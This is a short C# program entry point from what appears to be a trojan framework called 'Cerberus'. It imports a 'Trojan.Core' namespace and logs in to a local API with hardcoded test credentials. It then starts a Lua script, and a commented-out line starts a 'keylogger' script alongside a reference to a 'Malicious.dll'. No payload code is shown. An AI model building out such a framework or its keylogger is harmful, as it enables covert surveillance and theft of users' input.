using Cerberus.Domain.ApiService.ApiService;
using Cerberus.Domain.Models.Person;
using Cerberus.Presentation.Trojan.Core;
using RestSharp;

public class Program
{

    //[DllImport("Cerberus.Malicious.dll", CallingConvention = CallingConvention.Cdecl)]
    //public static extern int testMan();

    private static async Task Main(string[] args)
    {

        UserApiService userService = new UserApiService(new RestClient("http://localhost:5108/api"));

        User user = await userService.GetUserByLogin("user@user","user");

        Console.WriteLine("TESTANDO:" + user.Name);

        LuaScriptManager _scriptManager = new LuaScriptManager();
        _scriptManager.LoadScripts();

        _scriptManager.StartScript("luaok");

        //_ = _scriptManager.StartScriptAsync("luaok");
        //_ = await _scriptManager.StartScriptAsync("keylogger");

    }
}